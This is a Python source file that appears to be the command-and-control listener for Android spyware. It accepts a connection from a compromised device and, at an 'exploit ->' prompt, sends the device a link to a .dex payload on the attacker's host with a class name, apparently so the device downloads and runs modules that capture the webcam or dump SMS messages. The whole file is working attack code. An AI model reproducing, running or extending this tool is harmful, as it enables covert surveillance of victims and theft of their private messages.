import socket
import settings
import threading

commands = {
    "webcam": "WebCam",
    "dumpsms": "DumpSms"
}

def listen_for_response(sock):
    while True:
        data = sock.recv(1024)
        print(f"Received data: {data.decode()}")

def startTCPListener():
    # Create a TCP socket
    listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the host and port
    listener_socket.bind((settings.LHOST, settings.LPORT))

    # Listen for incoming connections
    listener_socket.listen(1)

    print(f"Listening for incoming connections on port {settings.LPORT}...")


    # Accept a new connection
    client_socket, client_address = listener_socket.accept()

    print(f"Received connection from {client_address[0]}:{client_address[1]}")

    # Create a new thread and start the HTTP server in that thread
    server_thread = threading.Thread(target=listen_for_response,args=([client_socket]))
    server_thread.start()

    while True:
        try:
            # Process the connection

            # Example: Send a response back to the client
            command = input("exploit -> ")

            if(command=='exit'):
                break
            if(command=='' or command not in commands):
                print("skip")
                continue
            
            className = commands[command]
            response = "http://"+ settings.LHOST + "/dex_files/" + command + ".dex " + className + "\n"
            
            client_socket.sendall(response.encode())
            print("Message sent: " + response)

         
        
        except:
            # Close the connection
            client_socket.close()
            print("Socket closed")
            break
        
  
